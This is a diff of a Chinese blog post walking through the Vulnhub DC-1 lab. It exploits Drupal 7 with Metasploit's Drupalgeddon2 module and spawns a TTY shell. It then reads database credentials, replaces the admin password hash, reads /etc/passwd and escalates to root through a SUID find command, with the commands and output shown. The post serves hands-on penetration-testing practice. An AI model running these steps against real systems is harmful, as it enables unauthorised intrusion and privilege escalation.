@@ -173,7 +173,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.4k 字
+      4.5k 字
     </span>
   
 
@@ -216,48 +216,20 @@
             <h1 style="display: none">Vulnhub DC-1 Writeup</h1>
             
             <div class="markdown-body" id="post-body">
-              <h1 id="Vunhub-DC-1-Writeup"><a href="#Vunhub-DC-1-Writeup" class="headerlink" title="Vunhub DC-1 Writeup"></a>Vunhub DC-1 Writeup</h1><h2 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">（官方地址）</a></p>
-<pre><code class="hljs vim">DESCRIPTION
-DC-<span class="hljs-number">1</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> purposely built vulnerable lab <span class="hljs-keyword">for</span> the purpose of gaining experience in the world of penetration testing.
-
-It was designed <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> <span class="hljs-keyword">a</span> challenge <span class="hljs-keyword">for</span> beginners, but just how easy it <span class="hljs-keyword">is</span> will depend <span class="hljs-keyword">on</span> your skills <span class="hljs-built_in">and</span> knowledge, <span class="hljs-built_in">and</span> your ability <span class="hljs-keyword">to</span> learn.
-
-To successfully <span class="hljs-built_in">complete</span> this challenge, you will require Linux skills, familiarity with the Linux <span class="hljs-keyword">command</span> <span class="hljs-built_in">line</span> <span class="hljs-built_in">and</span> experience with basic penetration testing tools, such <span class="hljs-keyword">as</span> the tools that can <span class="hljs-keyword">be</span> found <span class="hljs-keyword">on</span> Kali Linux, <span class="hljs-built_in">or</span> Parrot Security OS.
-
-There are multiple ways of gaining root, however, I have included some flags which contain clues <span class="hljs-keyword">for</span> beginners.
-
-There are five flags in total, but the ultimate goal <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">read</span> the flag in root<span class="hljs-string">'s home directory. You don'</span>t even need <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> root <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> this, however, you will require root privileges.
-
-Depending <span class="hljs-keyword">on</span> your skill level, you may <span class="hljs-keyword">be</span> able <span class="hljs-keyword">to</span> skip finding most of these flags <span class="hljs-built_in">and</span> <span class="hljs-keyword">go</span> straight <span class="hljs-keyword">for</span> root.
-
-Beginners may encounter challenges that they have never come across previously, but <span class="hljs-keyword">a</span> Google <span class="hljs-built_in">search</span> should <span class="hljs-keyword">be</span> <span class="hljs-keyword">all</span> that <span class="hljs-keyword">is</span> required <span class="hljs-keyword">to</span> obtain the information required <span class="hljs-keyword">to</span> <span class="hljs-built_in">complete</span> this challenge.</code></pre>
-
-
-
+              <h1 id="Vunhub-DC-1-Writeup"><a href="#Vunhub-DC-1-Writeup" class="headerlink" title="Vunhub DC-1 Writeup"></a>Vunhub DC-1 Writeup</h1><h2 id="靶机描述："><a href="#靶机描述：" class="headerlink" title="靶机描述："></a>靶机描述：</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">（官方地址）</a></p>
+<p>提示一共有5个flag,最好还要拿到root</p>
+<blockquote>
+<p>DESCRIPTION<br>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
+<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
+<p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p>
+<p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p>
+<p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p>
+<p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p>
+<p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p>
+</blockquote>
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117150857.png" srcset="/img/loading.gif" alt=""></p>
-<h2 id="nmap发现DC-1主机"><a href="#nmap发现DC-1主机" class="headerlink" title="nmap发现DC-1主机"></a>nmap发现DC-1主机</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap 192.168.43.*</span>
+<h2 id="nmap发现DC-1主机-全面扫描主机"><a href="#nmap发现DC-1主机-全面扫描主机" class="headerlink" title="nmap发现DC-1主机,全面扫描主机"></a>nmap发现DC-1主机,全面扫描主机</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap 192.168.43.*</span>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 01:57 EST
-Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.1
-Host is up (0.044s latency).
-Not shown: 998 closed ports
-PORT      STATE SERVICE
-53/tcp    open  domain
-16080/tcp open  osxwebadmin
-MAC Address: 26:C8:92:E7:C9:C5 (Unknown)
-
-Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.160
-Host is up (0.00011s latency).
-Not shown: 992 closed ports
-PORT     STATE SERVICE
-80/tcp   open  http
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-2382/tcp open  ms-olap3
-3306/tcp open  mysql
-3389/tcp open  ms-wbt-server
-5357/tcp open  wsdapi
-MAC Address: 34:E1:2D:52:8D:7F (Intel Corporate)
 
 Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.165
 Host is up (0.00016s latency).
@@ -266,15 +238,10 @@ PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
 111/tcp open  rpcbind
-MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)
+MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)</code></pre>
 
-Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.225
-Host is up (0.0000050s latency).
-All 1000 scanned ports on 192.168.43.225 are closed
-
-Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 3.08 seconds</code></pre>
-
-<h2 id="nmap详细扫描"><a href="#nmap详细扫描" class="headerlink" title="nmap详细扫描"></a>nmap详细扫描</h2><pre><code class="hljs shell">root@kali:~# nmap 192.168.43.165 -A -sV -sC -p 1-65535
+<h3 id="nmap详细扫描"><a href="#nmap详细扫描" class="headerlink" title="nmap详细扫描"></a>nmap详细扫描</h3><p>可以看到有80和22端口,接下来我们从80端口入手</p>
+<pre><code class="hljs shell">root@kali:~# nmap 192.168.43.165 -A -sV -sC -p 1-65535
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 02:04 EST
 Nmap scan report for 192.168.43.165
 Host is up (0.00026s latency).
@@ -328,7 +295,7 @@ Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds</code></pre>
 http://192.168.43.165/ [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.43.165], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</code></pre>
 
 <p>CMS是Drupal 7，接下来尝试看看msfconsole</p>
-<h2 id="方法1：msfconsole"><a href="#方法1：msfconsole" class="headerlink" title="方法1：msfconsole"></a>方法1：msfconsole</h2><pre><code class="hljs bash">msf5 &gt; search drupal target:7.x
+<h2 id="方法1-80端口"><a href="#方法1-80端口" class="headerlink" title="方法1(80端口)"></a>方法1(80端口)</h2><h3 id="msfconsole搜索drupal的模块"><a href="#msfconsole搜索drupal的模块" class="headerlink" title="msfconsole搜索drupal的模块"></a>msfconsole搜索drupal的模块</h3><pre><code class="hljs bash">msf5 &gt; search drupal target:7.x
 
 Matching Modules
 ================
@@ -337,7 +304,8 @@ Matching Modules
    -  ----                                      ---------------  ----       -----  -----------
    0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</code></pre>
 
-<p>搜索到一个exploit，查看一下info</p>
+<p>搜索到一个exploit，查看一下这个exploit的info(具体信息),看得info里面的target信息有对应的版本</p>
+<p>  4   Drupal 7.x (PHP In-Memory)<br>  5   Drupal 7.x (PHP Dropper)<br>  6   Drupal 7.x (Unix In-Memory)<br>  7   Drupal 7.x (Linux Dropper)</p>
 <pre><code class="hljs bash">msf5 &gt; info exploit/unix/webapp/drupal_drupalgeddon2
 
        Name: Drupal Drupalgeddon 2 Forms API Property Injection
@@ -408,7 +376,7 @@ Also known as:
   SA-CORE-2018-002
   Drupalgeddon 2</code></pre>
 
-<p>看得info里面的target信息有对应的版本，尝试使用这个exploit，首先要设置option，这里只需要set rhost，再run一下</p>
+<p>尝试使用这个exploit，首先要设置option，这里只需要set rhost，再run一下(可能不会成功,只是尝试)</p>
 <pre><code class="hljs bash">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhosts 192.168.43.165
 rhosts =&gt; 192.168.43.165
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options 
@@ -450,7 +418,7 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run
 
 meterpreter &gt;</code></pre>
 
-<p>msfconsole就会返回一个shell？尝试ls命令</p>
+<p>msfconsole就会返回一个shell？尝试ls命令,ls命令可以使用</p>
 <pre><code class="hljs bash">meterpreter &gt; ls
 Listing: /var/www
 =================
@@ -523,7 +491,7 @@ xmlrpc.php
 whoami 
 www-data</code></pre>
 
-<p>但是有些命令不可以用，比如su就明确说我们的这个不是来自terminal的命令</p>
+<p>但是有些命令不可以用，比如su命令就明确说我们的这个不是来自terminal的命令</p>
 <pre><code class="hljs bash">sudo
 /bin/sh: 7: sudo: not found
 vim
@@ -536,8 +504,7 @@ su: must be run from a terminal</code></pre>
 Terminate channel 0? [y/N]  
 [-] core_channel_interact: Operation failed: 1</code></pre>
 
-<h3 id="python将简单的Shell转换成为完全交互式的TTY"><a href="#python将简单的Shell转换成为完全交互式的TTY" class="headerlink" title="python将简单的Shell转换成为完全交互式的TTY"></a>python将简单的Shell转换成为完全交互式的TTY</h3><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span> 
-www-data@DC-1:/var/www$</code></pre>
+<h3 id="python将简单的Shell转换成为完全交互式的TTY"><a href="#python将简单的Shell转换成为完全交互式的TTY" class="headerlink" title="python将简单的Shell转换成为完全交互式的TTY"></a>python将简单的Shell转换成为完全交互式的TTY</h3><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
 
 <pre><code class="hljs bash">www-data@DC-1:/var/www$ ls -l
 ls -l
@@ -573,7 +540,7 @@ drwxr-xr-x  7 www-data www-data  4096 Nov 21  2013 themes
 cat flag1.txt
 Every good CMS needs a config file - and so <span class="hljs-keyword">do</span> you.</code></pre>
 
-<p>这里应该就是下一个flag的提示了：提示是cms的配置文件。经过搜索可以知道</p>
+<p>这里应该就是下一个flag的提示了：提示是找cms的配置文件。经过搜索可以知道配置文件的路径</p>
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126104721.png" srcset="/img/loading.gif" alt=""></p>
 <h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>进入之后看到有一个settings.php的文件,cat看一下</p>
 <pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/sites/default</span><span class="hljs-variable">$ </span>ls
@@ -734,38 +701,40 @@ show tab\les;
 80 rows in set (0.00 sec)</code></pre>
 
 <p>进入users表里</p>
-<pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;
-select <span class="hljs-symbol">*</span> from users;
+<pre><code class="hljs mysql">mysql&gt; select * from users;
+select * from users;
 +-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
-|<span class="hljs-string"> uid </span>|<span class="hljs-string"> name  </span>|<span class="hljs-string"> pass                                                    </span>|<span class="hljs-string"> mail              </span>|<span class="hljs-string"> theme </span>|<span class="hljs-string"> signature </span>|<span class="hljs-string"> signature_format </span>|<span class="hljs-string"> created    </span>|<span class="hljs-string"> access     </span>|<span class="hljs-string"> login      </span>|<span class="hljs-string"> status </span>|<span class="hljs-string"> timezone            </span>|<span class="hljs-string"> language </span>|<span class="hljs-string"> picture </span>|<span class="hljs-string"> init              </span>|<span class="hljs-string"> data </span>|
+| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |
 +-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
-|<span class="hljs-string">   0 </span>|<span class="hljs-string">       </span>|<span class="hljs-string">                                                         </span>|<span class="hljs-string">                   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">           </span>|<span class="hljs-string"> NULL             </span>|<span class="hljs-string">          0 </span>|<span class="hljs-string">          0 </span>|<span class="hljs-string">          0 </span>|<span class="hljs-string">      0 </span>|<span class="hljs-string"> NULL                </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       0 </span>|<span class="hljs-string">                   </span>|<span class="hljs-string"> NULL </span>|
-|<span class="hljs-string">   1 </span>|<span class="hljs-string"> admin </span>|<span class="hljs-string"> $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt </span>|<span class="hljs-string"> admin@example.com </span>|<span class="hljs-string">       </span>|<span class="hljs-string">           </span>|<span class="hljs-string"> NULL             </span>|<span class="hljs-string"> 1550581826 </span>|<span class="hljs-string"> 1606360471 </span>|<span class="hljs-string"> 1605782358 </span>|<span class="hljs-string">      1 </span>|<span class="hljs-string"> Australia/Melbourne </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       0 </span>|<span class="hljs-string"> admin@example.com </span>|<span class="hljs-string"> b:0; </span>|
-|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Fred  </span>|<span class="hljs-string"> $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg </span>|<span class="hljs-string"> fred@example.org  </span>|<span class="hljs-string">       </span>|<span class="hljs-string">           </span>|<span class="hljs-string"> filtered_html    </span>|<span class="hljs-string"> 1550581952 </span>|<span class="hljs-string"> 1550582225 </span>|<span class="hljs-string"> 1550582225 </span>|<span class="hljs-string">      1 </span>|<span class="hljs-string"> Australia/Melbourne </span>|<span class="hljs-string">          </span>|<span class="hljs-string">       0 </span>|<span class="hljs-string"> fred@example.org  </span>|<span class="hljs-string"> b:0; </span>|
+|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |
+|   1 | admin | $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt | admin@example.com |       |           | NULL             | 1550581826 | 1606360471 | 1605782358 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |
+|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |
 +-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
 3 rows in set (0.00 sec)</code></pre>
 
 <p>看起来很乱只要有用的信息</p>
-<pre><code class="hljs asciidoc">mysql&gt; select uid,name,pass from users;
-<span class="hljs-section">select uid,name,pass from users;
-+-----+-------+---------------------------------------------------------+</span>
-<span class="hljs-section">| uid | name  | pass                                                    |
-+-----+-------+---------------------------------------------------------+</span>
+<pre><code class="hljs mysql">mysql&gt; select uid,name,pass from users;
+select uid,name,pass from users;
++-----+-------+---------------------------------------------------------+
+| uid | name  | pass                                                    |
++-----+-------+---------------------------------------------------------+
 |   0 |       |                                                         |
 |   1 | admin | $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt |
-<span class="hljs-section">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
-+-----+-------+---------------------------------------------------------+</span>
+|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
++-----+-------+---------------------------------------------------------+
 3 rows in set (0.00 sec)</code></pre>
 
 <p>这里的pass明显经过类似md5一类的加密方式加密过的,没有办法解密出来</p>
 <p>所以我们的思路是看他是怎么加密的,然后用相同的方式去加密”pass”,然后把”pass”的加密后的密文update到数据库中,替换掉原来的密文,那么就可以用”admin”和”pass”去登陆了</p>
 <h3 id="进入script目录-生成新的密码"><a href="#进入script目录-生成新的密码" class="headerlink" title="进入script目录,生成新的密码"></a>进入script目录,生成新的密码</h3><p>这里进入scripts目录看一下</p>
-<p><em>/scripts 命令行脚本 在命令行可以执行的脚本文件，包括安装脚本，数据库备份脚本等</em></p>
-<pre><code class="hljs stata">www-data@DC-1:/<span class="hljs-keyword">var</span>/www/scripts$ <span class="hljs-keyword">ls</span>
-<span class="hljs-keyword">ls</span>
-code-clean.<span class="hljs-keyword">sh</span>  drupal.<span class="hljs-keyword">sh</span>            <span class="hljs-keyword">generate</span>-d6-content.<span class="hljs-keyword">sh</span>  password-hash.<span class="hljs-keyword">sh</span>
-cron-curl.<span class="hljs-keyword">sh</span>   dump-database-d6.<span class="hljs-keyword">sh</span>  <span class="hljs-keyword">generate</span>-d7-content.<span class="hljs-keyword">sh</span>  <span class="hljs-keyword">run</span>-tests.<span class="hljs-keyword">sh</span>
-cron-lynx.<span class="hljs-keyword">sh</span>   dump-database-d7.<span class="hljs-keyword">sh</span>  includes                <span class="hljs-keyword">test</span>.script</code></pre>
+<blockquote>
+<p>/scripts 命令行脚本 在命令行可以执行的脚本文件，包括安装脚本，数据库备份脚本等</p>
+</blockquote>
+<pre><code class="hljs bash">www-data@DC-1:/var/www/scripts$ ls
+ls
+code-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.sh
+cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.sh
+cron-lynx.sh   dump-database-d7.sh  includes                test.script</code></pre>
 
 <p>此目录有个password-hash.sh,猜测是这个cms的密码加密算法</p>
 <pre><code class="hljs dart">www-data<span class="hljs-meta">@DC</span><span class="hljs-number">-1</span>:/<span class="hljs-keyword">var</span>/www/scripts$ cat password-hash.sh
@@ -794,8 +763,13 @@ Example:      &#123;$script&#125; "mynewpassword"</code></pre>
 <p>报错</p>
 <pre><code class="hljs groovy"><span class="hljs-string">bash:</span> password-hash.<span class="hljs-string">sh:</span> command not found</code></pre>
 
-<p><em>linux中“.sh”文件是脚本文件，一般都是bash脚本，我们可以使用sh命令运行“sh xxx.sh”，并且由于在linux中sh是链接到bash上的，所以sh与bash在功能上是没有区别的。</em></p>
-<p>文件是php文件所以再尝试生成</p>
+<blockquote>
+<p>linux中“.sh”文件是脚本文件，一般都是bash脚本，我们可以使用sh命令运行“sh xxx.sh”，并且由于在linux中sh是链接到bash上的，所以sh与bash在功能上是没有区别的。</p>
+</blockquote>
+<blockquote>
+<p>程序必须以下面的行开始（必须方在文件的第一行）：<br>#!/bin/sh<br>符号#!用来告诉系统它后面的参数是用来执行该文件的程序。在这个例子中我们使用/bin/sh来执行程序。</p>
+</blockquote>
+<p>第一行是#!/usr/bin/php,所以再尝试生成</p>
 <pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/scripts</span><span class="hljs-variable">$ </span>php password-hash.sh <span class="hljs-string">"pass"</span>
 php password-hash.sh <span class="hljs-string">"pass"</span>
 
@@ -810,7 +784,9 @@ php password-hash.sh <span class="hljs-string">"pass"</span>
 <pre><code class="hljs python">Special PERMS will help FIND the passwd - but yo<span class="hljs-string">u'll need to -exec that command to work out how to get what'</span>s <span class="hljs-keyword">in</span> the shadow.
 翻译:特殊的PERMS可以帮助找到密码-但您需要-<span class="hljs-keyword">exec</span>该命令来确定如何获取隐藏的内容。</code></pre>
 
-<h3 id="找passwd文件"><a href="#找passwd文件" class="headerlink" title="找passwd文件"></a>找passwd文件</h3><p><em>Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</em></p>
+<h3 id="找passwd文件"><a href="#找passwd文件" class="headerlink" title="找passwd文件"></a>找passwd文件</h3><blockquote>
+<p>Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</p>
+</blockquote>
 <pre><code class="hljs bash">www-data@DC-1:/etc$ cat passwd
 cat passwd
 root:x:0:0:root:/root:/bin/bash
@@ -839,7 +815,9 @@ sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
 mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="hljs-literal">false</span>
 flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code></pre>
 
-<p><em>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</em></p>
+<blockquote>
+<p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p>
+</blockquote>
 <p>看到最后一行有个叫flag4的用户</p>
 <h3 id="进入-home目录-falg4"><a href="#进入-home目录-falg4" class="headerlink" title="进入/home目录,falg4"></a>进入/home目录,falg4</h3><pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
 ls
@@ -852,42 +830,56 @@ Can you use this same <span class="hljs-function"><span class="hljs-keyword">met
 <span class="hljs-title">Probably</span>. <span class="hljs-title">But</span> <span class="hljs-title">perhaps</span> <span class="hljs-title">it</span>'<span class="hljs-title">s</span> <span class="hljs-title">not</span> <span class="hljs-title">that</span> <span class="hljs-title">easy</span>.  <span class="hljs-title">Or</span> <span class="hljs-title">maybe</span> <span class="hljs-title">it</span> <span class="hljs-title">is</span>?</span></code></pre>
 
 <p>flag4的提示说需要拿到root用户,可能还有最后一个flag</p>
-<h3 id="尝试打开etc-shadow文件"><a href="#尝试打开etc-shadow文件" class="headerlink" title="尝试打开etc/shadow文件"></a>尝试打开etc/shadow文件</h3><pre><code class="hljs vim">www-data@DC-<span class="hljs-number">1</span>:/etc$ <span class="hljs-keyword">cat</span> shadow 
-<span class="hljs-keyword">cat</span> shadow
-<span class="hljs-keyword">ca</span><span class="hljs-variable">t:</span> shado<span class="hljs-variable">w:</span> Permission denied</code></pre>
+<h3 id="尝试打开etc-shadow文件"><a href="#尝试打开etc-shadow文件" class="headerlink" title="尝试打开etc/shadow文件"></a>尝试打开etc/shadow文件</h3><pre><code class="hljs bash">www-data@DC-1:/etc$ cat shadow 
+cat shadow
+cat: shadow: Permission denied</code></pre>
 
 <p>发现www-data用户<strong>无权限</strong>看到里面的内容</p>
-<p><em>/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</em></p>
+<blockquote>
+<p>/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p>
+</blockquote>
 <p>这就和flag4的拿root的提示相同了,拿接下来的任务就是拿root权限了</p>
 <h3 id="拿root权限-提权"><a href="#拿root权限-提权" class="headerlink" title="拿root权限(提权)"></a>拿root权限(提权)</h3><p>提权第一时间想到suid提权,首先查看系统上运行的所有SUID可执行文件</p>
-<pre><code class="hljs routeros"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span>
-<span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>
-<span class="hljs-builtin-name">find</span> / -user root -perm -4000-print2&gt;/dev/<span class="hljs-literal">null</span>
-<span class="hljs-builtin-name">find</span> / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</code></pre>
+<pre><code class="hljs bash"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span>
+find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+find / -user root -perm -4000-print2&gt;/dev/null
+find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</code></pre>
 
-<pre><code class="hljs crystal">www-data@DC-<span class="hljs-number">1</span>:<span class="hljs-regexp">/etc$ 
-find /</span> -perm -u=s -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/nullfind</span> / -perm -u=s -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span>
-<span class="hljs-regexp">/bin/mount</span>
-<span class="hljs-regexp">/bin/ping</span>
-<span class="hljs-regexp">/bin/su</span>
-<span class="hljs-regexp">/bin/ping</span>6
-<span class="hljs-regexp">/bin/umount</span>
-<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/at
-/usr</span><span class="hljs-regexp">/bin/chsh</span>
-<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/passwd
-/usr</span><span class="hljs-regexp">/bin/newgrp</span>
-<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn
-/usr</span><span class="hljs-regexp">/bin/gpasswd</span>
-<span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/procmail
-/usr</span><span class="hljs-regexp">/bin/find</span>
-<span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/exim4
-/usr</span><span class="hljs-regexp">/lib/pt</span>_chown
-<span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/openssh/ssh</span>-keysign
-<span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/eject/dmcrypt</span>-get-device
-<span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/dbus-1.0/dbus</span>-daemon-launch-helper
-<span class="hljs-regexp">/sbin/mount</span>.nfs</code></pre>
+<pre><code class="hljs bash">www-data@DC-1:/etc$ 
+find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/nullfind / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs</code></pre>
 
-<p>利用find文件提权</p>
+<p>利用find文件提权(只能用以下命令提权,这里只有find)</p>
+<blockquote>
+<ul>
+<li>nmap</li>
+<li>vim</li>
+<li>find</li>
+<li>bash</li>
+<li>more</li>
+<li>less</li>
+<li>nano</li>
+<li>cp</li>
+</ul>
+</blockquote>
 <pre><code class="hljs bash">www-data@DC-1:/etc$ find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;
 find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;
 <span class="hljs-comment"># whoami</span>
@@ -909,8 +901,8 @@ Hopefully you<span class="hljs-string">'ve enjoyed this and learned some new ski
 You can let me know what you thought of this little journey
 by contacting me via Twitter - @DCAU7</span></code></pre>
 
-
-
+<h2 id="方法2-22端口"><a href="#方法2-22端口" class="headerlink" title="方法2(22端口)"></a>方法2(22端口)</h2><p>在知道有个用户flag4之后，也可以从22端口入手。现在是知道了ssh的用户名flag4，但是密码不知道</p>
+<p>可以尝试穷举密码</p>
 
             </div>
             <hr>
@@ -932,7 +924,7 @@ by contacting me via Twitter - @DCAU7</span></code></pre>
                     
                     
                       <a href="/2020/11/05/%E6%8A%80%E6%9C%AF%E5%90%8D%E8%AF%8D%E5%B7%A5%E5%85%B7%E7%99%BE%E7%A7%91%E9%A1%B5%E9%9D%A2/">
-                        <span class="hidden-mobile">技术/名词/工具百科页面</span>
+                        <span class="hidden-mobile">技术名词工具百科页面</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
